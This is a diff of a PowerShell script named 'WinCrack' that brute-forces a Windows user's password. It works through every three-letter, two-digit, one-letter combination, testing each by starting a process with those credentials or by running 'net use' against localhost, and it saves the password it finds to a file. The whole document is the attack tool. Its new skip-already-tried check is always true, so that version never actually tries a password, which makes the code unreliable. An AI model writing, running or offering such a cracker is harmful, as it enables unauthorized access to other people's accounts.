@@ -1,62 +1,56 @@
-[console]::Title = "WinCrack"
-[console]::ForegroundColor = 'green'
+# -----------------------------
+# SIGMA LLLNNL PASSWORD CRACKER
+# -----------------------------
+[console]::Title = "WinCrack LLLNNL"
+$letters = 'a'..'z'
+$numbers = 0..9
+$domain = Read-Host "Domain (leave blank for local)"
+$user = Read-Host "Username"
+$stateFile = "wincrack_state.txt"
+$foundFile = "wincrack_found.txt"
+$count = 0
 
-function win {
-    function check ($cmd, $username, $password, $domain) {
-        try {
-            $ps = New-Object System.Diagnostics.ProcessStartInfo
-            $ps.FileName = $cmd
-            $ps.UseShellExecute = $false
-            $ps.UserName = $username
-            $pass = ConvertTo-SecureString $password -AsPlainText -Force
-            $ps.Password = $pass
-            $ps.Domain = $domain
-            [System.Diagnostics.Process]::Start($ps) | Out-Null
-            "1"
-        } catch {
-            "0"
-        }
-    }
+# Load last state
+if (Test-Path $stateFile) {
+    $count = [int](Get-Content $stateFile)
+}
 
-    # --- LLLNNL setup ---
-    $letters = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
-    $numbers = 0..9
+function Try-Crack($password) {
+    $cmd = "net use \\127.0.0.1 /user:`"$user`" $password"
+    $result = & cmd /c $cmd 2>&1
+    if ($LASTEXITCODE -eq 0) { return $true } else { return $false }
+}
 
-    Write-Host "Windows user password attack"
-    $dom = Read-Host -Prompt "Domain"
-    $user = Read-Host -Prompt "Username"
+# Combo generator LLLNNL
+for ($l1=0; $l1 -lt $letters.Length; $l1++) {
+    for ($l2=0; $l2 -lt $letters.Length; $l2++) {
+        for ($l3=0; $l3 -lt $letters.Length; $l3++) {
+            for ($n1=0; $n1 -lt $numbers.Length; $n1++) {
+                for ($n2=0; $n2 -lt $numbers.Length; $n2++) {
+                    for ($l4=0; $l4 -lt $letters.Length; $l4++) {
+                        $count++
+                        $password = "$($letters[$l1])$($letters[$l2])$($letters[$l3])$($numbers[$n1])$($numbers[$n2])$($letters[$l4])"
+                        
+                        # Skip combos already tried
+                        if ($count -le [int]$count) { continue }
 
-    $dt = (Get-Date).DateTime
-    Write-Host "Started attack at $dt"
+                        Write-Host "[$count] Trying $password ..." -NoNewline
 
-    foreach ($l1 in $letters) {
-        foreach ($l2 in $letters) {
-            foreach ($l3 in $letters) {
-                foreach ($n1 in $numbers) {
-                    foreach ($n2 in $numbers) {
-                        foreach ($l4 in $letters) {
-                            $combo = "$l1$l2$l3$n1$n2$l4"
-                            $run = check -username $user -password $combo -domain $dom -cmd whoami
-                            Write-Host "Trying $combo ..." -ForegroundColor Cyan
+                        if (Try-Crack $password) {
+                            Write-Host " ✅ WINNER: $password"
+                            $password | Out-File -FilePath $foundFile -Encoding UTF8
+                            exit
+                        } else {
+                            Write-Host " ❌"
+                        }
 
-                            if ($run -eq "1") {
-                                $dt = (Get-Date).DateTime
-                                Write-Host "[DONE] Password found: $combo at $dt" -ForegroundColor Green
-                                
-                                # Save the winning combo to a file for rizz purposes
-                                $combo | Out-File -FilePath "sigma_rizz_password.txt" -Encoding UTF8
-                                return
-                            }
+                        # Save progress every 100 combos
+                        if ($count % 100 -eq 0) {
+                            $count | Out-File -FilePath $stateFile -Encoding UTF8
                         }
                     }
                 }
             }
         }
     }
-
-    Write-Host "All combos attempted. No password found." -ForegroundColor Red
-}
-
-while ($true) {
-    win
 }
